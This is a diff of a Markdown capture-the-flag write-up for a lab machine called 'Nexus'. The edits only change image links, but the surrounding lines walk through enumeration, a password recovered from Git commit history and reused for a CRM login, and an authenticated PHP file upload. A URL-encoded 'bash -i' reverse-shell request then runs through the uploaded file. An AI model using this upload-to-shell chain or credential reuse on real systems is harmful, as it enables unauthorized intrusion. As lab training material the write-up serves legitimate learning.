@@ -43,7 +43,7 @@ Nexus is an easy-difficulty Linux machine featuring an exposed Gitea repository 
 ## Enumeration
 
 ### Nmap Scan
-![[Attachments/Screenshot 2026-09-20 203303.png]]
+![](images/Screenshot 2026-09-20 203303.png)
 ```bash
 nmap -sCV 10.129.112.245
 ```
@@ -69,7 +69,7 @@ sudo sh -c 'echo "10.129.112.245 nexus.htb" >> /etc/hosts'
 These will matter later for credential reuse.
 
 ### Vhost Fuzzing
-![[Attachments/Screenshot 2026-09-20 204121.png]]
+![](images/Screenshot 2026-09-20 204121.png)
 ```bash
 ffuf -u http://nexus.htb -H 'Host: FUZZ.nexus.htb' \
   -w SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
@@ -87,15 +87,15 @@ sudo sh -c 'echo "10.129.112.245 git.nexus.htb billing.nexus.htb" >> /etc/hosts'
 ```
 
 ### Gitea Enumeration (git.nexus.htb)
-![[Attachments/Screenshot 2026-09-20 204149 1.png]]
+![](images/Screenshot 2026-09-20 204149 1.png)
 Gitea v1.26.0, anonymous **Explore** access is enabled — no login required to browse public repos and users.
 
 - **Users found:** `jones`, `admin`
 - **Public repo found:** `admin/krayin-docker-setup`
-![[Attachments/Screenshot 2026-09-20 204208.png]]
+![](images/Screenshot 2026-09-20 204208.png)
 
 The repo contains three files: `.env`, `docker-compose.yml`, `documents`.
-![[Attachments/Screenshot 2026-09-20 204341 1.png]]
+![](images/Screenshot 2026-09-20 204341 1.png)
 
 **`.env`:**
 - `APP_URL=http://billing.nexus.htb` — confirms the CRM's vhost
@@ -105,7 +105,7 @@ The repo contains three files: `.env`, `docker-compose.yml`, `documents`.
 - Confirms the stack: `webkul/krayin:latest` (Krayin CRM) + MySQL 8.0
 - `APP_DEBUG: "true"` — flags that debug mode is likely enabled on the live app 
 ### Credential Leak via Commit History
-![[Attachments/Screenshot 2026-09-20 204539.png]]
+![](images/Screenshot 2026-09-20 204539.png)
 The latest commit to `admin/krayin-docker-setup` has `DB_PASSWORD=` empty, but browsing the **commit history** reveals an earlier commit where the password was still present:
 
 ```
@@ -119,7 +119,7 @@ commit 1615c465b74e5d7ad3162873382dd8b3869ca892
 See: [[Git Commit History Leakage]]
 
 ### Krayin CRM Login
-![[Attachments/Screenshot 2026-09-20 204555.png]]
+![](images/Screenshot 2026-09-20 204555.png)
 Using the leaked password with the hiring manager's email found earlier on the main site:
 - **Email:** `j.matthew@nexus.htb`
 - **Password:** `N27xh!!2ucY04`
@@ -127,7 +127,7 @@ Using the leaked password with the hiring manager's email found earlier on the m
 Login succeeds → redirected to `billing.nexus.htb/admin/dashboard`.
 
 ### Version Fingerprinting
-![[Attachments/Screenshot 2026-09-20 204816.png]]
+![](images/Screenshot 2026-09-20 204816.png)
 The admin panel footer / account dropdown discloses:
 ```
 Version: 2.2.0
@@ -143,7 +143,7 @@ Searching `krayin version 2.2.0 cve` surfaces several critical vulnerabilities a
 | CVE-2026-38527 | SSRF | 8.5 (High) |
 
 CVE-2026-38526 is the target: an authenticated arbitrary file upload in the TinyMCE upload endpoint, with no extension allowlist, saving files in a directory directly accessible over HTTP.
-![[Attachments/Screenshot 2026-09-20 204857.png]]
+![](images/Screenshot 2026-09-20 204857.png)
 ### First Attempt — CSRF Token Pitfall
 
 Sending a raw `GET`/`POST` to `/admin/tinymce/upload` directly in Burp Repeater (copy-pasted from an old captured request) initially failed:
@@ -156,9 +156,9 @@ Sending a raw `GET`/`POST` to `/admin/tinymce/upload` directly in Burp Repeater 
 
 The session cookie itself is a Laravel-encrypted, signed value (`iv` / `value` / `mac` JSON structure, base64+URL-decoded) — confirming this is standard Laravel session encryption, not something to tamper with directly.
 ### Successful Upload (Fresh Token)
-![[Attachments/Screenshot 2026-09-20 213331.png]]
+![](images/Screenshot 2026-09-20 213331.png)
 Capturing a **live** request directly from the browser (fresh CSRF token + session) and forwarding it to Repeater succeeds:
-![[Attachments/Screenshot 2026-09-20 213517.png]]
+![](images/Screenshot 2026-09-20 213517.png)
 ```http
 POST /admin/tinymce/upload HTTP/1.1
 Host: billing.nexus.htb
@@ -211,7 +211,7 @@ GET /storage/tinymce/dbc615ddfed31ce8a8b7b447faf61bb0.php?cmd=bash%20-i%20%3E%26
 ```
 
 Listener catches the shell as `www-data`.
-![[Attachments/Screenshot 2026-09-20 214025.png]]
+![](images/Screenshot 2026-09-20 214025.png)
 
 ### TTY Upgrade
 ```bash
